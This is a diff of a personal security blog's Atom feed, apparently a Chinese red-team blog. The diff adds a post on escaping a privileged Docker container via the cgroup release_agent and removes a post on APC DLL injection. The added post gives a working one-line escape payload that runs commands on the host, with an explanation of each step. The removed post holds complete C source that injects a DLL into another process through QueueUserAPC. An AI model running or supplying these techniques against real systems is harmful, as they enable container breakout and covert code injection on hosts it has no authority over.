@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-01-25T05:34:14.180Z</updated>
+  <updated>2021-01-28T18:44:50.347Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用cgroup快速逃逸docker</title>
+    <link href="http://422926799.github.io/posts/99258750.html"/>
+    <id>http://422926799.github.io/posts/99258750.html</id>
+    <published>2021-01-28T18:40:23.000Z</published>
+    <updated>2021-01-28T18:44:50.347Z</updated>
+    
+    <content type="html"><![CDATA[<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1461215205&auto=1&height=66"></iframe></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>昨天在群里看见篇docker逃逸的文章，看到个没见到的操作。复现并记录一波</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>容器拥有特权模式<br>docker run -it –privileged ubuntu /bin/bash</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>payload</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_releaset=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab`touch /o; echo $t/c &gt;$d/release_agent;printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3OM9.png" alt=""></p><p>命令刨析</p><pre><code>d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)` #寻找cgroup文件夹位置mkdir -p $d/wecho 1 &gt;$d/w/notify_on_release #该文件的内容为1时，当cgroup退出时（不再包含任何进程和子cgroup），将调用release_agent里面配置的命令。新cgroup被创建时将默认继承父cgroup的这项配置。t=`sed -n &#39;s/.*\perdir=\([^,]*\).*/\1/p&#39; /etc/mtab` #从当前的分区挂载寻找该容器的UIDtouch /oecho $t/c &gt; $d/release_agent #里面包含了cgroup退出时将会执行的命令，系统调用该命令时会将相应cgroup的相对路径当作参数传进去。printf &#39;#!/bin/sh\nhostname &gt;&#39;&quot;$t/o&quot; &gt;/c; #输出&lt;command&gt; \&gt; 和容器pid路径 图二 (将在母机上执行的命令执行到容器根目录里面的o文件)chmod +x /csh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot; #当前cgroup中的所有进程ID，系统不保证ID是顺序排列的，且ID有可能重复 （将进程PID写入除非cgroup执行）sleep 1cat /o</code></pre><p><img src="https://s3.ax1x.com/2021/01/29/yC3jq1.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3xVx.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/29/yC3za6.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当docker容器使用特权模式启动时，有权操控cgroup，由于cgroup是Linux内核的一个功能。利用cgroup可以直接执行母机的命令 （说法可能有误）</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/" target="_blank" rel="noopener">https://www.intezer.com/blog/research/how-we-escaped-docker-in-azure-functions/</a><br><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/" target="_blank" rel="noopener">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a><br><a href="https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F" target="_blank" rel="noopener">https://twitter.com/_fel1x/status/1151487051986087936?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1151487053370187776%7Ctwgr%5E&amp;ref_url=https%3A%2F%2Fblog.trailofbits.com%2F2019%2F07%2F19%2Funderstanding-docker-container-escapes%2F</a><br><a href="https://zh.wikipedia.org/wiki/Cgroups" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/Cgroups</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/player?type=2&amp;</summary>
+      
+    
+    
+    
+    
+    <category term="bypass" scheme="http://422926799.github.io/tags/bypass/"/>
+    
+  </entry>
   
   <entry>
     <title>UID shellcode硬编码</title>
@@ -445,26 +467,6 @@
     
     
     <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>APC dll注入</title>
-    <link href="http://422926799.github.io/posts/c9faf9c0.html"/>
-    <id>http://422926799.github.io/posts/c9faf9c0.html</id>
-    <published>2020-09-24T04:27:53.000Z</published>
-    <updated>2020-09-24T04:32:13.553Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="原理和要求"><a href="#原理和要求" class="headerlink" title="原理和要求"></a>原理和要求</h2><p>APC注入原理：<br>APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入。</p><p>APC注入要求：</p><pre><code>1.必须是多线程环境下2.注入的程序必须会调用上面的那些同步对象.那么我们可以注入APC,注意下条件,也不是所有都能注入的.注入方法的原理:1.当对面程序执行到某一个上面的等待函数的时候,系统会产生一个中断2.当线程唤醒的时候,这个线程会优先去Apc队列中调用回调函数3.我们利用QueueUserApc,往这个队列中插入一个回调4.插入回调的时候,把插入的回调地址改为LoadLibrary,插入的参数我们使用VirtualAllocEx申请内存,并且写入进去</code></pre><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><pre><code class="c">#include &quot;stdafx.h&quot;#include&lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;void GetErr() {        printf(&quot;Error:%d&quot;, GetLastError());        printf(&quot;\n&quot;);        exit(1);}int getprocess(WCHAR *processname) {        HANDLE  data = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);        if (data == INVALID_HANDLE_VALUE) {               printf(&quot;[-] CreateToolhelp32Snapshot failure&quot;);               GetErr();        }        else {               PROCESSENTRY32W pe = { sizeof(pe) };               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               for (bool dd = Process32FirstW(data, &amp;pe);dd;dd = Process32NextW(data,  &amp;pe)) {                       WCHAR *pname = pe.szExeFile;                       int pid = pe.th32ProcessID;                       if (wcscmp(processname, pname) == 0) {                              WCHAR info[650] =TEXT(&quot;name:&quot;);                              lstrcatW(info, pname);                              lstrcatW(info, TEXT(&quot; &quot;));                              wprintf(info);                              wprintf(TEXT(&quot;pid:&quot;));                              printf(&quot;%d\n&quot;, pid);                              return pid;                       }               }        }        return 0;}BOOL apcinject(int pid,WCHAR *dll) {        HANDLE openprocess = OpenProcess(PROCESS_ALL_ACCESS,0 ,pid);        if (openprocess == 0) {               GetErr();        }        else {               printf(&quot;[*] OpenProcess Sucess\n&quot;);        }        LPVOID vt = VirtualAllocEx(openprocess, 0, 1024, MEM_COMMIT,  PAGE_EXECUTE_READWRITE);        if (vt == 0) {               printf(&quot;[-] VirtualAllocEx faliure\n&quot;);               GetErr();        }        else {               printf(&quot;[*] VirtualAllocEx Sucess\n&quot;);        }        SIZE_T dwRet;        bool write = WriteProcessMemory(openprocess, vt, dll, MAX_PATH, &amp;dwRet);        if (write == 0) {               printf(&quot;[-] WriteProcessMemory faiure&quot;);               GetErr();        }        else {               printf(&quot;[*] WriteProcessMemory Sucess\n&quot;);        }        THREADENTRY32 te = { sizeof(te) };        HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);        if (handleSnap == INVALID_HANDLE_VALUE)        {               printf(&quot;[-] CreateToolhelp32Snapshot faiure&quot;);               GetErr();        }else {               printf(&quot;[*] CreateToolhelp32Snapshot Sucess\n&quot;);               /*               if (Thread32First(handleSnap, &amp;te))               {                       do {                              if (te.th32OwnerProcessID == pid)                              {                                      printf(&quot;%d\n&quot;, te.th32OwnerProcessID);                              }                       } while (Thread32Next(handleSnap, &amp;te));               }                       */               for (bool td = Thread32First(handleSnap, &amp;te);td;td =  Thread32Next(handleSnap, &amp;te)) {                       if (te.th32OwnerProcessID == pid) {                              int tid = te.th32ThreadID;                              HANDLE openthread = OpenThread(THREAD_ALL_ACCESS, 0, tid);                              if (openthread == 0) {                                      printf(&quot;[-] OpenThread faiure&quot;);                                      GetErr();                              }                              else {                                      printf(&quot;[*] OpenThread Sucess threadid:%d\n&quot;,tid);                                      DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW,  openthread, (ULONG_PTR)vt);                                      if (dwRet == 0) {                                             printf(&quot;[-] QueueUserAPC failure\n&quot;);                                             GetErr();                                      }                                      else {                                             printf(&quot;[+] APC Dll inject Sucess\n&quot;);                                      }                              }                       }               }        }        return true;}int main(){        WCHAR *name = TEXT(&quot;calc.exe&quot;);        WCHAR *dll = TEXT(&quot;C:\\Users\\JiuShi\\Desktop\\testdll.dll&quot;);        int pid = getprocess(name);        if (pid != 0) {               apcinject(pid, dll);        }        system(&quot;pause&quot;);    return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/09/24/wzcGgU.png" alt=""></p><p>试了一下，explorer、calc都能注</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;原理和要求&quot;&gt;&lt;a href=&quot;#原理和要求&quot; class=&quot;headerlink&quot; title=&quot;原理和要求&quot;&gt;&lt;/a&gt;原理和要求&lt;/h2&gt;&lt;p&gt;APC注入原理：&lt;br&gt;APC注入的原理是利用线程被唤醒时APC中的主从函数会被执行的机制，并以此去执行我们的DLL</summary>
-      
-    
-    
-    
     
   </entry>
   
